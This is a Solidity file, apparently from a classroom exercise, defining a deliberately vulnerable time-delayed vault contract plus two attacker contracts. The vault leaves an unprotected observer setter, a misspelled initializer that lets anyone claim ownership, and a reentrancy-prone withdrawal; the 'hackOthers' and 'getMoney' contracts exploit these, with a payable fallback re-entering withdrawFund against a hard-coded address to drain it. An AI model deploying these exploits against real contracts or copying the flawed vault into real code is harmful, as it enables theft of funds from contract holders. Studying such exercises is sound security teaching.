pragma solidity ^0.4.17;

contract BasicMultiOwnerVault {
    address[] public authorizedUsers;
    address public owner;
    address public withdrawObserver;
    address public additionalAuthorizedContract;
    address public proposedAAA;
    uint public lastUpdated;
    bool[] public votes;
    address [] public observerHistory;

    modifier onlyAuthorized() {
        bool pass = false;
        if(additionalAuthorizedContract == msg.sender) {
            pass = true;
        }
        
        for (uint i = 0; i < authorizedUsers.length; i++) {
            if(authorizedUsers [i] == msg.sender) {
                pass = true;
                break;
            }
        }
        require (pass);
        _;
    }
    
    modifier onlyOnce() {
        require(owner == 0x0);
        _;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    modifier recordAction() {
        lastUpdated = now;
        _;
    }
    
    function initilizeVault() recordAction onlyOnce {
        owner = msg.sender;
    }
    
    function setObserver(address ob) {
        bool duplicate = false;
        for (uint i = 0; i < observerHistory.length; i++) {
            if (observerHistory[i] == ob) {
                duplicate = true;
            }
        }
        
        if (!duplicate) {
            withdrawObserver = ob;
            observerHistory.push(ob);
        }
    }
    
    function addToReserve() payable recordAction external returns (uint) {
        assert(msg.value > 0.01 ether);
        return this.balance;
    }
    
    function basicWithdraw(address dst) internal returns (bool) {
        require(this.balance >= 0.0005 ether);
        bool res = dst.call.value(0.0005 ether)();
        return res;
    }
    
    function checkAllVote() private returns (bool) {
        for(uint i = 0; i < votes.length; i++) {
            if(!votes[i]) {
                return false;
            }
        }
        
        return true;
    }
    
    function clearVote() private {
        for(uint i = 0; i < votes.length; i++) {
            votes[i] = false;
        }
    }

    function addAuthorizedAccount(uint votePosition, address proposal) onlyAuthorized external {
        require(votePosition < authorizedUsers.length);
        require(msg.sender == authorizedUsers[votePosition]);
        if (proposal != proposedAAA) {
            clearVote();
            proposedAAA = proposal;
        }
        
        votes[votePosition] = true;
        if (checkAllVote()) {
            additionalAuthorizedContract = proposedAAA;
            clearVote();
        }
    }
    
    function resolve() onlyOwner {
        if(now >= lastUpdated + 12 hours) {
            selfdestruct(owner);
        }
    }

}

contract TimeDelayedVault is BasicMultiOwnerVault {
    uint  public nextWithdrawTime;
    uint  public withdrawCoolDownTime;
    
    function TimeDelayedVault() recordAction {
        nextWithdrawTime = now;
        withdrawCoolDownTime = 2 hours;
        this.call(bytes4(sha3("initializeVault()")));
       
        // Please note, the following code chunk is different for each group, all group members are added to authorizedUsers array
        authorizedUsers.push(0x14723a09acff6d2a60dcdf7aa4aff308fddc160c); //second
        authorizedUsers.push(0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db);//third


        for(uint i=0; i<authorizedUsers.length; i++) {
            votes.push(false);
        }
    }
    
    function withdrawFund(address dst) onlyAuthorized external returns (bool) {
        require(now > nextWithdrawTime);
        assert(withdrawObserver.call(bytes4(sha3("observe()"))));
        bool res = basicWithdraw(dst);
        nextWithdrawTime = nextWithdrawTime + withdrawCoolDownTime;
        return res;
    }
}

contract hackOthers {
    address otherAddress = 0x0; //change to othergroup contract address
    function addObserver() {
        otherAddress.call(bytes4(sha3("setObserver()")),this);
    }
    function setOwner(){ //100% fail
        otherAddress.call(bytes4(sha3("initilizeVault()")));
    }
}

contract getMoney{
    address ct_addr = 0xAEc6E567C38746cAeDCB55a5A007704E69e00c70;
    uint count = 0;
    TimeDelayedVault ct = TimeDelayedVault(ct_addr);
    function addObserver(){
       ct.setObserver(this);    
    }
    function checkObserver() returns (bool){
        return ct_addr == ct.withdrawObserver();
    }
    function hack(){ // need checkObserver first
         ct.withdrawFund(this);
    }
    function () payable {
        if(count<=1000){
            ct.withdrawFund(this);
        }else{
            count = 0;
        }
    }
}

